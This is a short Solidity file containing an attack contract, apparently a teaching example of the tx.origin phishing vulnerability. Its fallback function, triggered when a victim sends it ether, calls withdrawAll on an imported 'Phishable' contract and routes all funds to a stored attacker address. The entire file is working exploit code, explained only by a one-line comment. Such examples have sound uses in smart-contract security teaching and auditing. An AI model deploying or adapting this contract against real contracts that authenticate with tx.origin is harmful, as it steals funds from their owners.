pragma solidity ^0.4.25;

import "./Phishable.sol";

contract Attack {

    Phishable phishableContract;
    address attacker; // The attackers address to receive funds.

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function() payable {
        phishableContract.withdrawAll(attacker);
    }
}
